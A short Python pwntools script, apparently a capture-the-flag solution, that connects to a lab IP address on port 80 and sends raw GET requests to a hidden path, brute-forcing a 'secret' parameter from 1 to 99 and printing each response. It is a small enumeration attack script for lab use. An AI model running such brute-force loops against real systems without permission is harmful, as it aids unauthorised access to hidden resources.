#!/usr/bin/env python

from pwn import *

io = remote('10.10.127.85', 80)

for i in range (1,100,1):
    io.sendline('GET /th1s_1s_h1dd3n/?secret={} \r\n\r\n'.format(i))
    print(io.recvline())
    
# io.interact()